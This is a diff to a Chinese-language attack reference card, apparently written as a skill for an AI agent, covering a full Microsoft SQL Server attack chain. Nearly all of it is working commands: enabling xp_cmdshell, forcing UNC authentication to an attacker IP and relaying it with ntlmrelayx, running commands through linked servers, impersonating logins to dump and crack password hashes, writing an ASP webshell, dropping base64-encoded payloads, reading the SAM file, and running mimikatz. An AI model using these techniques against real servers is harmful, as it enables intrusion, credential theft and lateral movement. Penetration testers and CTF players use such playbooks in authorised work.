@@ -4,7 +4,7 @@ description: 'MSSQL 攻击全链：xp_cmdshell/UNC injection/linked servers/impe
 disable-model-invocation: true
 metadata: { domain: db, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 # MSSQL 完整攻击链参考
 
@@ -25,7 +25,7 @@ nxc mssql <target> -u <user> -p <pass> -q "SELECT is_srvrolemember('sysadmin')"
 
 # 批量扫描
 nxc mssql 192.168.1.0/24 -u <user> -p <pass>
-```
+```text
 
 ### Impacket mssqlclient.py
 ```bash
@@ -40,7 +40,7 @@ mssqlclient.py <user>@<target> -hashes :<nt_hash>
 # 交互式 shell 后
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
-```
+```text
 
 ### 手工 SQL 侦查命令
 ```sql
@@ -96,7 +96,7 @@ EXEC sp_configure 'Ole Automation Procedures';
 -- 检查哪些用户有模拟权限
 SELECT * FROM sys.server_permissions 
 WHERE permission_name = 'IMPERSONATE';
-```
+```text
 
 ---
 
@@ -110,20 +110,22 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 
--- 方法2：手动改配置值（绕过某些监控，直接改 sys.configurations）
-UPDATE sys.configurations SET value = 1 WHERE name = 'xp_cmdshell';
-RECONFIGURE;
+-- 方法2：RECONFIGURE WITH OVERRIDE（sp_configure 被策略阻止时）
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE WITH OVERRIDE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE WITH OVERRIDE;
 
 -- 验证
 EXEC xp_cmdshell 'whoami';
-```
+```text
 
 ### mssqlclient.py 快捷方式
-```
+```text
 SQL> enable_xp_cmdshell          # 自动启用
 SQL> xp_cmdshell whoami          # 执行命令
 SQL> xp_cmdshell powershell -enc <base64>
-```
+```text
 
 ### 常见问题
 
@@ -137,9 +139,8 @@ SQL> xp_cmdshell powershell -enc <base64>
 ### 重建 xp_cmdshell（如已被删除，需要 sysadmin）
 ```sql
 EXEC sp_addextendedproc 'xp_cmdshell', 'xplog70.dll';
--- 如果 xplog70.dll 也不存在，可尝试 xpstar.dll
-EXEC sp_addextendedproc 'xp_cmdshell', 'xpstar.dll';
-```
+-- xp_cmdshell 位于 xplog70.dll；若重建失败，确认该 DLL 存在于 Binn 目录
+```text
 
 ### xp_cmdshell 输出捕获
 ```sql
@@ -148,7 +149,7 @@ CREATE TABLE #output (result NVARCHAR(4000));
 INSERT INTO #output EXEC xp_cmdshell 'whoami';
 SELECT * FROM #output WHERE result IS NOT NULL;
 DROP TABLE #output;
-```
+```text
 
 ---
 
@@ -167,7 +168,7 @@ sudo impacket-ntlmrelayx -t smb://<target-ip> -smb2support -of hash.txt
 
 # 或中继到 LDAP
 sudo impacket-ntlmrelayx -t ldap://<dc-ip> --escalate-user <user> --delegate-access
-```
+```text
 
 ### SQL 触发命令
 ```sql
@@ -185,7 +186,7 @@ EXEC master.dbo.xp_getfiledetails '\\<attacker-ip>\share\file.txt';
 
 -- 通过 OPENROWSET（需要 ad-hoc distributed queries 开启）
 SELECT * FROM OPENROWSET('SQLNCLI', 'Server=<attacker-ip>;UID=test;PWD=test;', 'SELECT 1');
-```
+```text
 
 ### 权限要求
 - `xp_dirtree` / `xp_subdirs` / `xp_fileexist`：**PUBLIC 角色即可执行**
@@ -195,7 +196,7 @@ SELECT * FROM OPENROWSET('SQLNCLI', 'Server=<attacker-ip>;UID=test;PWD=test;', '
 ### 常见坑
 - Windows Defender / EDR 可能拦截出站 SMB
 - 如果出站 445 被防火墙阻止，尝试 139（NetBIOS）
-- MSSQL 服务账户必须是 NetworkService 或域账户才能发起认证；`LOCAL SERVICE` 和 `LOCAL SYSTEM` 可能使用机器账户
+- MSSQL 服务账户发起 UNC 认证时：`LOCAL SYSTEM`/`NETWORK SERVICE` 用机器账户，`LOCAL SERVICE` 用匿名身份（无法捕获 NetNTLMv2），域账户用该账户
 - responder 必须和 MSSQL 在同一网段或路由可达
 
 ---
@@ -217,7 +218,7 @@ SELECT * FROM sys.servers;
 
 -- 查看当前服务器上定义的远程登录映射
 EXEC sp_helplinkedsrvlogin;
-```
+```text
 
 ### 查询链接服务器
 ```sql
@@ -234,7 +235,7 @@ SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT name FROM sys.databases');
 -- 检查链接服务器上的权限
 SELECT * FROM OPENQUERY([LINKED_SERVER], 
   'SELECT is_srvrolemember(''sysadmin'')');
-```
+```text
 
 ### 在链接服务器上执行命令
 ```sql
@@ -249,7 +250,7 @@ EXEC sp_serveroption 'LINKED_SERVER_A', 'rpc', 'true';
 
 -- 然后在 A 上通过 EXECUTE 远程执行
 EXEC ('EXEC (''SELECT @@version'') AT [LINKED_SERVER_B]') AT [LINKED_SERVER_A];
-```
+```text
 
 ### 利用链接服务器提升权限
 ```sql
@@ -268,7 +269,7 @@ EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')
   AT [LINKED_SERVER];
 EXEC ('EXEC xp_cmdshell ''powershell -enc ...''') 
   AT [LINKED_SERVER];
-```
+```text
 
 ### 创建链接服务器（需要 ALTER ANY SERVER 或 sysadmin）
 ```sql
@@ -284,7 +285,7 @@ EXEC sp_addlinkedsrvlogin
   @locallogin=NULL, 
   @rmtuser='sa', 
   @rmtpassword='P@ssw0rd';
-```
+```text
 
 ---
 
@@ -313,7 +314,7 @@ WHERE sp.permission_name = 'IMPERSONATE';
 -- 方法3：查看当前安全上下文
 SELECT * FROM sys.login_token;
 SELECT * FROM sys.user_token;
-```
+```text
 
 ### 执行模拟
 ```sql
@@ -334,7 +335,7 @@ USE [target_db];
 EXECUTE AS USER = 'dbo';
 SELECT USER_NAME();
 REVERT;
-```
+```text
 
 ### 🆕 Impersonation 获取密码哈希（Eighteen 模式）
 
@@ -356,7 +357,7 @@ SELECT username, password_hash FROM admins;
 
 -- 步骤5：识别哈希格式
 -- pbkdf2:sha256:N$salt$hash → Werkzeug (Flask) → hashcat -m 10900
-```
+```text
 
 ### Werkzeug PBKDF2-SHA256 哈希识别与破解
 ```bash
@@ -375,7 +376,7 @@ echo 'pbkdf2:sha256:600000$salt$hash' > hash.txt
 
 # 🆕 破解后的密码 → 立即去交互化 + 密码喷洒 WinRM
 nxc winrm dc01.htb -u users.txt -p '<cracked_pw>' --continue-on-success
-```
+```text
 
 ### 模拟数据库用户
 ```sql
@@ -384,7 +385,7 @@ USE [target_db];
 EXECUTE AS USER = 'dbo';
 SELECT USER_NAME();
 REVERT;
-```
+```text
 
 ### 利用 Trustworthy 数据库
 ```sql
@@ -403,7 +404,7 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 GO
 EXEC sp_elevate;
-```
+```text
 
 ### 注意
 - `EXECUTE AS LOGIN` 要求有对应登录的 `IMPERSONATE` 权限
@@ -420,7 +421,7 @@ EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'Ole Automation Procedures', 1;
 RECONFIGURE;
-```
+```text
 
 ### 通过 OLE 执行命令
 ```sql
@@ -446,7 +447,7 @@ EXEC sp_OASetProperty @sc, 'Language', 'VBScript';
 EXEC sp_OAMethod @sc, 'ExecuteStatement', NULL, 
   'CreateObject("WScript.Shell").Run "cmd /c whoami > C:\windows\temp\out2.txt", 0, True';
 EXEC sp_OADestroy @sc;
-```
+```text
 
 ### 优势
 - 不依赖 xp_cmdshell
@@ -482,7 +483,7 @@ SELECT * FROM OPENROWSET(
   BULK 'C:\Windows\repair\SAM', 
   SINGLE_BLOB
 ) AS data;
-```
+```text
 
 ### 读取文件 - fn_xe_file_target_read_file (SQL Server 2012+)
 ```sql
@@ -490,7 +491,7 @@ SELECT * FROM OPENROWSET(
 SELECT * FROM fn_xe_file_target_read_file(
   'C:\path\to\file.txt', NULL, NULL, NULL
 );
-```
+```text
 
 ### 读取文件 - sp_execute_external_script (SQL Server 2016+, 需要启用)
 ```sql
@@ -500,13 +501,13 @@ EXEC sp_execute_external_script
 import os
 print(os.popen("type C:\temp\file.txt").read())
 ';
-```
+```text
 
 ### 写文件 - OLE Automation
 ```sql
 -- 通过 FileSystemObject 写文件
 DECLARE @fso INT, @file INT, @text VARCHAR(8000);
-SET @text = '<%25= Shell("cmd /c whoami") %25>'; -- ASP webshell
+SET @text = '<%= Shell("cmd /c whoami") %>'; -- ASP webshell
 
 EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
 EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 
@@ -515,19 +516,19 @@ EXEC sp_OAMethod @file, 'Write', NULL, @text;
 EXEC sp_OAMethod @file, 'Close';
 EXEC sp_OADestroy @file;
 EXEC sp_OADestroy @fso;
-```
+```text
 
 ### 写文件 - xp_cmdshell + echo
 ```sql
 -- PowerShell 写文件（更适合二进制）
 EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\payload.exe -Value ([Convert]::FromBase64String(''BASE64_BLOB'')) -Encoding Byte"';
-```
+```text
 
 ### 写文件 - OPENROWSET BULK（需要目标表）
 ```sql
 -- 将文件内容首先导入表，再用 bcp 导出（间接方式）
 -- 不推荐直接用于攻击
-```
+```text
 
 ---
 
@@ -554,10 +555,10 @@ nmap -sV --script ms-sql-info <target>
 
 # 出站 SMB 是否可达（UNC 注入前检查）
 nmap -p 445 <attacker-ip>   # 从目标角度检查
-```
+```text
 
 ### 权限阶梯
-```
+```text
 PUBLIC 
   -> 枚举链接服务器
   -> UNC 注入 (xp_dirtree)
@@ -572,7 +573,7 @@ sysadmin
   -> 启用 OLE Automation
   -> 执行任何系统命令
   -> 模拟任何登录
-```
+```text
 
 ### xp_cmdshell 不工作的排查
 ```sql
@@ -585,45 +586,43 @@ EXEC sp_configure 'xp_cmdshell';
 -- config_value = 0 表示禁用
 
 -- 3. 检查执行权限
-SELECT * FROM syspermissions 
-WHERE grantee = USER_ID() 
-AND object_name(id) = 'xp_cmdshell';
+EXEC sp_helprotect 'xp_cmdshell';
 
 -- 4. 检查 SQL Server 服务账户
 EXEC xp_cmdshell 'whoami';
 -- NT AUTHORITY\NETWORK SERVICE 可能有网络限制
 -- NT AUTHORITY\SYSTEM 有高权限但无网络认证能力（UNC 注入可能使用计算机账户）
-```
+```text
 
 ### xp_cmdshell 权限被拒时的替代链
-```
+```text
 xp_cmdshell 不可用:
   -> OLE Automation (sp_OACreate)
   -> CLR 程序集（需要 CREATE ASSEMBLY 权限）
   -> Agent Jobs（需要 SQLAgentUserRole）
   -> 外部脚本 (sp_execute_external_script, SQL 2016+)
   -> xp_regwrite 修改注册表（若有权限）
-```
+```text
 
 ---
 
 ## 9. Password Extraction（密码提取）
 
 ### 🆕 Werkzeug PBKDF2-SHA256 哈希 (Flask/SQLAlchemy)
-```
+```yaml
 格式: pbkdf2:sha256:<iterations>$<salt>$<hash>
 特征: 以 "pbkdf2:sha256:" 开头
 hashcat: -m 10900
 来源: Flask Werkzeug security 模块 generate_password_hash()
 典型场景: 应用数据库 admin 表密码字段
 后续: 破解后密码喷洒 AD → WinRM/SSH
-```
+```text
 
 ### 从 sys.servers 提取链接服务器凭证
 ```sql
 -- 直查询（密码通常是加密的但可解密）
 SELECT name, data_source, provider_string FROM sys.servers;
-```
+```text
 
 ### 从连接字符串中提取
 ```sql
@@ -637,7 +636,7 @@ WHERE provider_string LIKE '%Password%'
 SELECT name, 
   CAST(CAST(credential_identity AS VARBINARY(MAX)) AS VARCHAR(MAX)) 
 FROM sys.credentials;
-```
+```text
 
 ### 使用 PowerUpSQL 提取
 ```powershell
@@ -648,20 +647,20 @@ Get-SQLInstanceDomain
 # 提取链接服务器密码
 Get-SQLServerLinkCrawl -Instance <target>
 Get-SQLServerPasswordHash -Instance <target>
-```
+```text
 
 ### 从内存中提取（Mimikatz / SafetyKatz）
 ```bash
 # 在目标服务器上
 mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
-```
+```text
 
 ### SSIS 包密码
 ```sql
 -- 查询 SSISDB 中的连接信息
 SELECT * FROM SSISDB.internal.object_parameters 
 WHERE parameter_name LIKE '%Password%';
-```
+```text
 
 ### SQL Agent 作业中的密码
 ```sql
@@ -674,13 +673,13 @@ FROM msdb.dbo.sysjobs j
 JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id
 WHERE js.command LIKE '%PASSWORD%' 
    OR js.command LIKE '%pwd%';
-```
+```text
 
 ---
 
 ## Quick Reference: Attack Path Decision Tree
 
-```
+```text
 获得 SQL 认证凭据
   │
   ├─ 是 sysadmin?
@@ -700,7 +699,7 @@ WHERE js.command LIKE '%PASSWORD%'
       ├─ 扫描 MSSQL 实例 (UDP 1434)
       ├─ 爆破弱密码 (sa, sqladmin, 空密码)
       └─ Kerberos SPN 枚举 → Kerberoasting
-```
+```text
 
 ---
 
@@ -711,4 +710,4 @@ nxc mssql <target> -u <user> -p <pass> -M mssql_priv
 nxc mssql <target> -u <user> -p <pass> -M web_delivery
 nxc mssql <target> -u <user> -p <pass> -M share_enum
 nxc mssql <target> -u <user> -p <pass> --local-auth --shares
-```
+```text
